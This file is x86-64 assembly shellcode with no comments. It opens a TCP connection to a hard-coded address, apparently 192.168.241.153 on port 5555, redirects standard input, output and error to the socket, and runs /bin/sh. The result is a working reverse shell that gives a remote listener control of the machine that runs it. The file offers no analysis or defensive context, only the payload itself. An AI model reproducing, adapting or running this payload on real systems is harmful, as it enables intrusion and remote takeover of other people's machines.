BITS 64

section .text

global _start
_start:

mov rax, 0x29
mov rdi, 2
mov rsi, 1
mov rdx, 0
syscall

mov r12, rax

sub rsp, 16

mov word [rsp], 2
mov word [rsp+2], 0xb315
mov dword [rsp+4], 0x99f1a8c0
mov qword [rsp+8], 0

mov rax, 0x2a
mov rdi, r12
mov rsi, rsp
mov rdx, 16
syscall

mov rax, 0x21
mov rdi, r12
mov rsi, 0
syscall

mov rax, 0x21
mov rdi, r12
mov rsi, 1
syscall

mov rax, 0x21
mov rdi, r12
mov rsi, 2
syscall

sub rsp, 8

mov byte [rsp], '/'
mov byte [rsp+1], 'b'
mov byte [rsp+2], 'i'
mov byte [rsp+3], 'n'
mov byte [rsp+4], '/'
mov byte [rsp+5], 's'
mov byte [rsp+6], 'h'
mov byte [rsp+7], 0

mov rax, 0x3b
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall


mov rax,60
mov rdi,0
syscall
